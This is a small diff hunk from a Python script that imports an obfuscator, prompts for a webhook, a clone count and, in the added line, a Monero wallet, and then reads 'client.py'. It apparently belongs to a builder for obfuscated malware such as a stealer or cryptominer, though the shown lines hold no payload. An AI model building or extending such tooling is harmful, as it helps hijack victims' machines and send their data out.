@@ -7,6 +7,7 @@ import pyImpossibleObf
 key ="loooood"
 webhook = input("Webhook : ")
 processnumbers = input("Number of clones (default : 3) : ")
+wallets = input("XMR Wallet : ")
 if processnumbers == "":
 	processnumbers = "3"
 filecontent = open("client.py", "r").read()
